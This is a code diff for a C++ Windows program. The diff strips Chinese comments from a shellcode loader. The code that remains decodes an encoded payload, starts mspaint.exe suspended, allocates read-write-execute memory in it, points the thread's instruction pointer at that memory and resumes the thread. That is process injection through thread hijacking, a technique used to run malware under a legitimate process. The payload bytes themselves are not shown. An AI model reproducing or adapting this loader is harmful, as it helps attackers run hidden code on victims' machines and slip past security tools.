@@ -17,8 +17,7 @@ int main(int argc, char argv[]) {
     pair<unsigned char*, int> result = undoShellcode(shellcode);
     unsigned char* my_payload = result.first;
     int len = result.second;
-
-    // 创建挂起进程
+    
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     if (!CreateProcess(NULL, (LPSTR)"mspaint.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
@@ -26,7 +25,6 @@ int main(int argc, char argv[]) {
         return 1;
     }
 
-    // 申请可读、可写、可执行的内存
     LPVOID lpBaseAddress = VirtualAllocEx(pi.hProcess, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (lpBaseAddress == NULL) {
         std::cout << "VirtualAllocEx failed: " << GetLastError() << std::endl;
@@ -39,7 +37,6 @@ int main(int argc, char argv[]) {
         return 1;
     }
 
-    // 获取线程上下文，并修改EIP/RIP的值为申请的内存的首地址
     CONTEXT ctx;
     ctx.ContextFlags = CONTEXT_FULL;
     if (!GetThreadContext(pi.hThread, &ctx)) {
@@ -51,8 +48,7 @@ int main(int argc, char argv[]) {
         std::cout << "SetThreadContext failed: " << GetLastError() << std::endl;
         return 1;
     }
-
-    // 恢复主线程
+    
     if (ResumeThread(pi.hThread) == -1) {
         std::cout << "ResumeThread failed: " << GetLastError() << std::endl;
         return 1;
